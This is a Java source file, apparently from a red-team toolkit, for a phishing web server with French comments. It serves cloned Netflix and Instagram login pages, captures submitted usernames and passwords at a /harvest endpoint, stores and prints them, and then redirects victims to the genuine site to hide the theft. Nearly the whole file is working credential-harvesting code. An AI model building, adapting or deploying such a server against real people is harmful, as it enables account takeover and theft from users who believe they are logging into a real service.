package fr.redteam.web;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

/**
 * Serveur HTTP minimal : GET / = page de login phishing, POST /harvest = enregistre login/password.
 */
public class PhishingHttpServer {

    private final String host;
    private final int port;
    private final PhishingPageGenerator pageGenerator;
    private final CredentialHarvester harvester;
    private final String defaultTemplate;
    private HttpServer server;

    public PhishingHttpServer(String host, int port, PhishingPageGenerator pageGenerator, CredentialHarvester harvester) {
        this(host, port, pageGenerator, harvester, null);
    }

    /** @param defaultTemplate template à servir sur GET / (ex. "netflix", "instagram"). Si null, affiche la liste. */
    public PhishingHttpServer(String host, int port, PhishingPageGenerator pageGenerator, CredentialHarvester harvester, String defaultTemplate) {
        this.host = host != null ? host : "0.0.0.0";
        this.port = port > 0 ? port : 8080;
        this.pageGenerator = pageGenerator != null ? pageGenerator : new PhishingPageGenerator();
        this.harvester = harvester != null ? harvester : new CredentialHarvester();
        this.defaultTemplate = defaultTemplate;
    }

    public void start() throws IOException {
        server = HttpServer.create(new InetSocketAddress(host, port), 0);
        server.createContext("/", this::handleRoot);
        server.createContext("/harvest", this::handleHarvest);
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
    }

    public void stop() {
        if (server != null) {
            server.stop(0);
        }
    }

    private void handleRoot(HttpExchange ex) throws IOException {
        if (!"GET".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "Method Not Allowed");
            return;
        }
        String template = defaultTemplate;
        String query = ex.getRequestURI().getQuery();
        if (query != null) {
            for (String p : query.split("&")) {
                if (p.startsWith("t=")) {
                    String t = p.substring(2).trim();
                    for (String n : PhishingPageGenerator.TEMPLATE_NAMES) {
                        if (n.equals(t)) { template = t; break; }
                    }
                    break;
                }
            }
        }
        String html;
        if (template != null && !template.isEmpty()) {
            html = pageGenerator.generateFromTemplate(template, "/harvest?t=" + template, "");
        } else {
            StringBuilder index = new StringBuilder();
            index.append("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Phishing</title></head><body style='font-family:sans-serif;padding:2rem;'>");
            index.append("<h1>Choisissez un template</h1><ul>");
            for (String name : PhishingPageGenerator.TEMPLATE_NAMES) {
                index.append("<li><a href='/?t=").append(name).append("'>").append(name).append("</a></li>");
            }
            index.append("</ul></body></html>");
            html = index.toString();
        }
        byte[] body = html.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
        ex.sendResponseHeaders(200, body.length);
        try (OutputStream out = ex.getResponseBody()) {
            out.write(body);
        }
    }

    private void handleHarvest(HttpExchange ex) throws IOException {
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "Method Not Allowed");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        String login = null, password = null;
        for (String part : body.split("&")) {
            String[] kv = part.split("=", 2);
            if (kv.length == 2) {
                String k = java.net.URLDecoder.decode(kv[0].trim(), StandardCharsets.UTF_8);
                String v = java.net.URLDecoder.decode(kv[1].trim(), StandardCharsets.UTF_8);
                if ("login".equalsIgnoreCase(k)) login = v;
                if ("password".equalsIgnoreCase(k)) password = v;
            }
        }
        if (login != null) {
            harvester.recordCredential(login, password);
            System.out.println("[Harvest] " + login + ":" + (password != null ? password : ""));
        }
        String redirectUrl = getRedirectUrl(ex.getRequestURI().getQuery());
        ex.getResponseHeaders().add("Location", redirectUrl);
        ex.sendResponseHeaders(302, -1);
        ex.close();
    }

    /** Redirige vers le vrai service selon le template (t=netflix ou t=instagram). */
    private String getRedirectUrl(String query) {
        if (query != null) {
            for (String p : query.split("&")) {
                if (p.startsWith("t=")) {
                    String t = p.substring(2).trim();
                    if ("netflix".equals(t)) return "https://www.netflix.com/login";
                    if ("instagram".equals(t)) return "https://www.instagram.com/";
                    break;
                }
            }
        }
        return "/";
    }

    private void send(HttpExchange ex, int code, String message) throws IOException {
        byte[] body = message.getBytes(StandardCharsets.UTF_8);
        ex.sendResponseHeaders(code, body.length);
        try (OutputStream out = ex.getResponseBody()) {
            out.write(body);
        }
    }

    public int getPort() {
        return port;
    }

    public String getHost() {
        return host;
    }

    public CredentialHarvester getHarvester() {
        return harvester;
    }
}
